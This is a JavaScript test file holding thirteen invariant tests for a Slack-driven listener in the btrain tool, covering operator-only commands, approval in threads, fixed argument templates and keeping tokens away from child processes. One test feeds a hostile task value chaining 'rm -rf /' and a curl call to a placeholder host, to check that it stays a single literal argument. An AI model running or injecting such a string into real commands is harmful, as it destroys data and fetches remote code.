// The thirteen invariants of the Slack listener (spec 025 implementation
// plan, "Architecture and invariants"). WS0 adds them; the workstream named in
// each skip removes it when its code makes the test pass (tasks T010, T015,
// T019, T024, T027, T031).
//
// Invariants 2, 5, and 6 hold at the unit level in WS1 (T010) and run now,
// against slack/inbound.mjs, slack/decide.mjs, slack/grammar.mjs, and
// slack/verbs.mjs. Their end-to-end form, through a running listener, is
// added by the workstream that builds the listener.
//
// The skipped tests are written against the planned interfaces: a listener in
// `slack/listen.mjs` (WS3) built as
// `createListener({ home, fetch, readers, cliPath, spawn, execFile, now })`
// with `cycle()` and `stop()`, `slack/runner.mjs` (WS4), and
// `slack/commands.mjs` (WS5). None exists yet, so each is imported inside a
// test body, never at module load. The workstream that enables a test fixes a
// name here if it settles on another one and says so in its handoff.
//
// No test calls Slack or starts a real model: reads and posts go to the fake
// of test/helpers/fake-slack.mjs. Every test that creates a btrain home or a
// repository puts it in a temporary directory, so none reads the real
// slack.json or writes the real inbox.json.
import { describe, it, after } from "node:test"
import assert from "node:assert/strict"
import fs from "node:fs/promises"
import fsSync from "node:fs"
import os from "node:os"
import path from "node:path"
import { execFile } from "node:child_process"
import { fileURLToPath } from "node:url"
import { promisify } from "node:util"
import { createFakeSlack } from "./helpers/fake-slack.mjs"
import { decide } from "../src/brain_train/slack/decide.mjs"
import { parseOperatorCommand } from "../src/brain_train/slack/grammar.mjs"
import { classifyInbound, HEARD } from "../src/brain_train/slack/inbound.mjs"
import { emptyInbox } from "../src/brain_train/slack/inbox.mjs"
import { buildChildArgs, FR4_FORBIDDEN, templateWords, VERBS } from "../src/brain_train/slack/verbs.mjs"

const exec = promisify(execFile)
const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..")
const CLI = path.join(REPO_ROOT, "src/brain_train/cli.mjs")
const slackModule = (name) => import(new URL(`../src/brain_train/slack/${name}`, import.meta.url))

// Obviously fake values, built at runtime so the source holds no string that
// matches a secret pattern.
const TOKEN = ["xoxb", "0000", "fake", "listen", "token"].join("-")
const OPERATOR = "U0000OPER"
const BOT = "U0000FAKE"
const CHANNEL = "C0000FAKE"
const NOW = 1700000000 * 1000
const tsAt = (ms) => `${Math.floor(ms / 1000)}.${String(ms % 1000).padStart(3, "0")}000`

const roots = []
after(async () => {
  await Promise.all(roots.map((root) => fs.rm(root, { recursive: true, force: true })))
})

/**
 * A temporary btrain home with a slack.json for the operator, and a
 * repository initialised by the real CLI with both toggles as given.
 */
async function createListenFixture({ slackListen = true, features = true } = {}) {
  const root = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "btrain-listen-inv-")))
  roots.push(root)
  const home = path.join(root, "home")
  const repo = path.join(root, "repo")
  await fs.mkdir(home, { recursive: true })
  await exec("git", ["init", "-q", "-b", "main", repo])
  await exec("git", ["-C", repo, "config", "user.email", "test@example.com"])
  await exec("git", ["-C", repo, "config", "user.name", "Test Bot"])
  const env = { ...process.env, BRAIN_TRAIN_HOME: home, BTRAIN_DASHBOARD_DISABLED: "1" }
  for (const key of ["BTRAIN_AGENT", "BRAIN_TRAIN_AGENT", "BTRAIN_LANE", "BTRAIN_LANE_LOCKED", "BTRAIN_REPO", "BTRAIN_LOOP_ACTIVE", "BTRAIN_SLACK_BOT_TOKEN"]) delete env[key]
  await exec("node", [CLI, "init", repo, "--tracked", "--core-only", "--agent", "claude", "--agent", "codex"], { cwd: repo, env })
  if (features) {
    const tomlPath = path.join(repo, ".btrain", "project.toml")
    const toml = await fs.readFile(tomlPath, "utf8")
    await fs.writeFile(tomlPath, `${toml.trimEnd()}\n\n[features]\nslack = true\nslack_listen = ${slackListen}\n`, "utf8")
  }
  const configPath = path.join(home, "slack.json")
  await fs.writeFile(configPath, `${JSON.stringify({
    botToken: TOKEN, label: "test-dev", operator: OPERATOR, channels: { [repo]: CHANNEL },
    pollSeconds: 1, orchestrator: { runner: "" },
  }, null, 2)}\n`, { mode: 0o600 })
  return { root, home, repo, env }
}

const REPO = { name: "repo", path: "/work/repo", laneIds: ["a", "e"], agents: ["claude", "codex"] }
const CHANNEL_CONTEXT = { repos: [REPO] }

function heardInput(message, { source = "history", parentTs = "" } = {}) {
  const heard = classifyInbound(message, { operator: OPERATOR, botUserId: BOT, source, parentTs })
  return {
    kind: "message",
    channel: CHANNEL,
    ts: message.ts,
    threadTs: source === "replies" ? parentTs : "",
    heard,
    command: heard.heard === HEARD.COMMAND ? parseOperatorCommand(message.text, CHANNEL_CONTEXT) : undefined,
  }
}

describe("the listener invariant harness itself", () => {
  // Not an invariant: proves on main that the fixture helper builds a btrain
  // home and a repository the way the skipped tests expect.
  it("creates a temporary home with the operator's slack.json and a repository with both toggles", async () => {
    const fixture = await createListenFixture()
    const config = JSON.parse(await fs.readFile(path.join(fixture.home, "slack.json"), "utf8"))
    assert.equal(config.operator, OPERATOR)
    assert.equal(config.channels[fixture.repo], CHANNEL)
    assert.match(await fs.readFile(path.join(fixture.repo, ".btrain", "project.toml"), "utf8"), /\[features\]\nslack = true\nslack_listen = true/)
    assert.ok(fixture.home.startsWith(fixture.root), "the home is under the temporary root")
    if (process.platform !== "win32") assert.equal((await fs.stat(path.join(fixture.home, "slack.json"))).mode & 0o777, 0o600)
  })
})

describe("spec 025 listener invariants", () => {
  it("1. a repository with slack_listen off, or with no [features] table, is not served, and its channel is never read", { skip: "WS2: the toggle and served repositories (T015)" }, async () => { // btrain-allow: skipped-test
    const { createListener } = await slackModule("listen.mjs")
    for (const options of [{ slackListen: false }, { features: false }]) {
      const fixture = await createListenFixture(options)
      const fake = createFakeSlack({ expectedToken: TOKEN })
      const listener = await createListener({ home: fixture.home, fetch: fake.fetch, env: fixture.env, now: () => NOW })
      assert.equal(listener.served.length, 0, JSON.stringify(options))
      await listener.cycle().catch(() => {})
      assert.deepEqual(fake.callsTo("conversations.history"), [], "no read call for that channel")
    }
  })

  it("2. a message is acted on only when its user is the operator and it has no app_id and no bot_id", () => {
    const base = { type: "message", text: "btrain> retry-review lane=e", ts: tsAt(NOW) }
    const authors = [
      { user: "U0000OTHR" },
      { user: OPERATOR, app_id: "A0000FAKE" },
      { user: OPERATOR, bot_id: "B0000FAKE" },
      { user: BOT, bot_id: "B0000FAKE", app_id: "A0000FAKE" },
    ]
    for (const author of authors) {
      for (const text of ["btrain> retry-review lane=e", `<@${BOT}> what is stuck?`, "approve"]) {
        for (const source of ["history", "replies"]) {
          const message = { ...base, ...author, text }
          const input = heardInput(message, { source, parentTs: source === "replies" ? "1699999999.000100" : "" })
          assert.equal(input.heard.heard, HEARD.IGNORED, JSON.stringify(author))
          const { actions } = decide(emptyInbox(), input, {}, NOW)
          assert.deepEqual(actions.map((action) => action.type), ["ignored"], `${JSON.stringify(author)} ${source} ${text}`)
        }
      }
    }
    // The same message typed by the operator is acted on.
    const typed = decide(emptyInbox(), heardInput({ ...base, user: OPERATOR }), {}, NOW)
    assert.deepEqual(typed.actions.map((action) => action.type), ["command"])
  })

  it("3. a message's ts is handled, and the state renamed into place, before any child or post for it starts", { skip: "WS3: the poll cycle (T019)" }, async () => { // btrain-allow: skipped-test
    const { createListener } = await slackModule("listen.mjs")
    const fixture = await createListenFixture()
    const fake = createFakeSlack({ expectedToken: TOKEN })
    fake.history(CHANNEL, [{ type: "message", user: OPERATOR, ts: tsAt(NOW), text: "btrain> status" }])
    const order = []
    const execFileSpy = () => {
      order.push(["child", JSON.parse(fsSync.readFileSync(path.join(fixture.home, "slack", "inbox.json"), "utf8")).handled])
      return { pid: 1 }
    }
    const listener = await createListener({ home: fixture.home, fetch: fake.fetch, env: fixture.env, execFile: execFileSpy, now: () => NOW })
    await listener.cycle()
    assert.ok(order.length > 0)
    for (const [, handled] of order) assert.ok(handled[`${CHANNEL}:${tsAt(NOW)}`], "handled before the child started")
    const restarted = await createListener({ home: fixture.home, fetch: fake.fetch, env: fixture.env, execFile: execFileSpy, now: () => NOW + 1000 })
    await restarted.cycle()
    assert.equal(order.length, 1, "no ts acts twice across a restart")
  })

  it("4. the text a command runs from is the stored canonical text, and the stored text is what was posted", { skip: "WS6: proposals and approval (T031)" }, async () => { // btrain-allow: skipped-test
    const { createListener } = await slackModule("listen.mjs")
    const fixture = await createListenFixture()
    const fake = createFakeSlack({ expectedToken: TOKEN })
    const listener = await createListener({ home: fixture.home, fetch: fake.fetch, env: fixture.env, now: () => NOW })
    await listener.cycle()
    const proposalPost = fake.posts.find((call) => /```/.test(call.body.text))
    assert.ok(proposalPost, "a proposal was posted")
    const inbox = JSON.parse(await fs.readFile(path.join(fixture.home, "slack", "inbox.json"), "utf8"))
    const stored = inbox.proposals[`${CHANNEL}:${proposalPost.result.ts}`]
    assert.ok(proposalPost.body.text.includes(stored.canonical.replaceAll(">", "&gt;")))
  })

  it("5. start runs from a proposal only after the operator's typed approve in that proposal's thread; pause never runs from a proposal", () => {
    const parent = tsAt(NOW)
    const opened = decide(emptyInbox(), heardInput({ type: "message", user: OPERATOR, ts: parent, text: `<@${BOT}> start a lane` }), {}, NOW).state
    const start = { verb: "start", repo: REPO, values: { owner: "codex", task: "t", files: "a" }, canonical: "btrain> start owner=codex\ntask: t\nfiles: a" }
    const posted = decide(opened, { kind: "proposal", channel: CHANNEL, thread: parent, ts: tsAt(NOW + 1000), proposal: start }, { repos: { "/work/repo": { auto: ["status", "flush", "poll-pr", "retry-review", "start"] } } }, NOW + 1000)
    assert.deepEqual(posted.actions, [], "start waits, even when the auto list names it")
    // Nothing but the operator's typed approve in that thread runs it.
    const notApprovals = [
      heardInput({ type: "message", user: OPERATOR, ts: tsAt(NOW + 2000), text: "approve", app_id: "A0000FAKE" }, { source: "replies", parentTs: parent }),
      heardInput({ type: "message", user: "U0000OTHR", ts: tsAt(NOW + 3000), text: "approve" }, { source: "replies", parentTs: parent }),
      heardInput({ type: "message", user: OPERATOR, ts: tsAt(NOW + 4000), text: "approve" }, { source: "replies", parentTs: "1699999999.000100" }),
      heardInput({ type: "message", user: OPERATOR, ts: tsAt(NOW + 5000), text: "approve" }),
      heardInput({ type: "message", user: OPERATOR, ts: tsAt(NOW + 6000), text: "yes, approve" }, { source: "replies", parentTs: parent }),
    ]
    let state = posted.state
    for (const input of notApprovals) {
      const result = decide(state, input, {}, NOW + 7000)
      assert.ok(!result.actions.some((action) => action.type === "command"), JSON.stringify(input.heard))
      state = result.state
    }
    const approved = decide(state, heardInput({ type: "message", user: OPERATOR, ts: tsAt(NOW + 8000), text: "approve" }, { source: "replies", parentTs: parent }), {}, NOW + 8000)
    assert.deepEqual(approved.actions.filter((action) => action.type === "command").map((action) => action.canonical), [start.canonical])

    const pause = decide(opened, { kind: "proposal", channel: CHANNEL, thread: parent, ts: tsAt(NOW + 9000), proposal: { verb: "pause", repo: REPO, values: {}, canonical: "btrain> pause" } }, {}, NOW + 9000)
    assert.ok(!pause.actions.some((action) => action.type === "command" || action.type === "pause"))
    assert.equal(VERBS.pause.children.length, 0, "pause starts no child")
  })

  it("6. every btrain child comes from a fixed template, each value one argument not starting with -, and no template names an FR-4 command", () => {
    for (const word of templateWords()) {
      const bare = word.replace(/^-+/, "")
      for (const forbidden of FR4_FORBIDDEN) {
        assert.ok(bare !== forbidden && !bare.split("-").includes(forbidden), `${word} names ${forbidden}`)
      }
    }
    const hostile = "x; rm -rf / && $(curl evil.invalid) `id` | tee \"q\""
    const [claim] = buildChildArgs("start", { lane: "e", owner: "codex", task: hostile, files: "a", "requested-via": "slack C x operator", "max-rounds": "4" })
    assert.equal(claim.argv[claim.argv.indexOf("--task") + 1], hostile, "the task is one argument, as written")
    assert.ok(claim.argv.every((item) => typeof item === "string"), "an argument list, never a shell string")
    for (const verb of Object.keys(VERBS)) {
      for (const child of VERBS[verb].children) {
        for (const item of child.template) assert.ok(typeof item === "string" || (item.value && !item.value.startsWith("-")), `${verb}: ${JSON.stringify(item)}`)
      }
    }
    for (const bad of ["-e", "--help", "--lane=a"]) {
      assert.throws(() => buildChildArgs("poll-pr", { lane: bad }), /may not start with "-"/)
      assert.equal(parseOperatorCommand(`btrain> poll-pr lane=${bad}`, CHANNEL_CONTEXT).ok, false)
    }
  })

  it("7. an orchestrator run starts with exactly its profile's arguments, in an empty directory, with only the allowed environment", { skip: "WS4: the model run (T024)" }, async () => { // btrain-allow: skipped-test
    const runner = await slackModule("runner.mjs")
    const profile = runner.resolveProfile("claude -p")
    assert.ok(profile, "claude -p has a profile")
    assert.equal(runner.resolveProfile("claude -p --dangerously-skip-permissions"), null)
    assert.equal(runner.resolveProfile("sh -c claude"), null)
    for (const name of Object.keys(runner.runEnvironment({ ...process.env, BTRAIN_SLACK_BOT_TOKEN: TOKEN, GITHUB_TOKEN: "x", OPENAI_API_KEY: "x" }))) {
      assert.doesNotMatch(name, /KEY|TOKEN|BTRAIN|SLACK/, name)
    }
  })

  it("8. nothing a model wrote is posted before the text handling of spec 024 FR-8", { skip: "WS4: the model run (T024); the reply split itself is tested in test/slack-reply.test.mjs" }, async () => { // btrain-allow: skipped-test
    const { createListener } = await slackModule("listen.mjs")
    const fixture = await createListenFixture()
    const fake = createFakeSlack({ expectedToken: TOKEN })
    const listener = await createListener({ home: fixture.home, fetch: fake.fetch, env: fixture.env, now: () => NOW })
    await listener.cycle()
    for (const post of fake.posts) {
      assert.doesNotMatch(post.body.text.replace(/<@U[A-Z0-9]+>/g, ""), /<|:\/\//, "no mention or link from model text")
    }
  })

  it("9. the Slack token is in no model input, child environment, state file, log line, or reply", { skip: "WS4: the model run (T024)" }, async () => { // btrain-allow: skipped-test
    const fixture = await createListenFixture()
    const files = await fs.readdir(path.join(fixture.home, "slack"), { recursive: true }).catch(() => [])
    for (const file of files) {
      const text = await fs.readFile(path.join(fixture.home, "slack", file), "utf8").catch(() => "")
      assert.ok(!text.includes(TOKEN), file)
    }
  })

  it("10. a poll cycle never waits for a child process", { skip: "WS3: the poll cycle (T019)" }, async () => { // btrain-allow: skipped-test
    const { createListener } = await slackModule("listen.mjs")
    const fixture = await createListenFixture()
    const fake = createFakeSlack({ expectedToken: TOKEN })
    fake.history(CHANNEL, [{ type: "message", user: OPERATOR, ts: tsAt(NOW), text: "btrain> retry-review lane=a" }])
    const neverEnds = () => ({ pid: 1, exited: new Promise(() => {}) })
    const listener = await createListener({ home: fixture.home, fetch: fake.fetch, env: fixture.env, spawn: neverEnds, execFile: neverEnds, now: () => NOW })
    const started = Date.now()
    await listener.cycle()
    await listener.cycle()
    assert.ok(Date.now() - started < 5000, "two cycles finished while the child runs")
  })

  it("11. no child gets an agent identity or a lane pin, and lane state is read only through the reader functions", { skip: "WS5: typed commands (T027)" }, async () => { // btrain-allow: skipped-test
    const commands = await slackModule("commands.mjs")
    const env = commands.childEnvironment({ ...process.env, BTRAIN_SLACK_BOT_TOKEN: TOKEN, BTRAIN_AGENT: "codex", BRAIN_TRAIN_AGENT: "codex", BTRAIN_LANE: "a", BTRAIN_LANE_LOCKED: "1", BTRAIN_REPO: "/x", BTRAIN_LOOP_ACTIVE: "1" })
    for (const name of ["BTRAIN_SLACK_BOT_TOKEN", "BTRAIN_AGENT", "BRAIN_TRAIN_AGENT", "BTRAIN_LANE", "BTRAIN_LANE_LOCKED", "BTRAIN_REPO", "BTRAIN_LOOP_ACTIVE"]) {
      assert.equal(env[name], undefined, name)
    }
    const source = await fs.readFile(path.join(REPO_ROOT, "src/brain_train/slack/listen.mjs"), "utf8")
    assert.doesNotMatch(source, /core\.mjs/, "the listener imports nothing from core.mjs")
  })

  it("12. one listener runs for each btrain home", { skip: "WS2: the lease (T015)" }, async () => { // btrain-allow: skipped-test
    const fixture = await createListenFixture()
    const lease = await slackModule("lease.mjs")
    const first = await lease.takeLease(path.join(fixture.home, "slack"), { operator: OPERATOR })
    assert.ok(first.held)
    const second = await lease.takeLease(path.join(fixture.home, "slack"), { operator: OPERATOR })
    assert.equal(second.held, false)
    assert.match(second.reason, new RegExp(String(process.pid)))
    await first.release()
  })

  it("13. core.mjs gains no function, patchHandoff keeps its line count, and runLoop changes once, by expectStatus", { skip: "WS6: checked after the last core.mjs edit of spec 025 (T031)" }, async () => { // btrain-allow: skipped-test
    const stages = await exec("node", [path.join(REPO_ROOT, "scripts/decomposition_inventory.mjs"), "--stages"], { cwd: REPO_ROOT }).then(() => 0, (error) => error.code ?? 1)
    assert.equal(stages, 0)
    const source = await fs.readFile(path.join(REPO_ROOT, "src/brain_train/core.mjs"), "utf8")
    assert.match(source, /expectStatus/)
  })
})
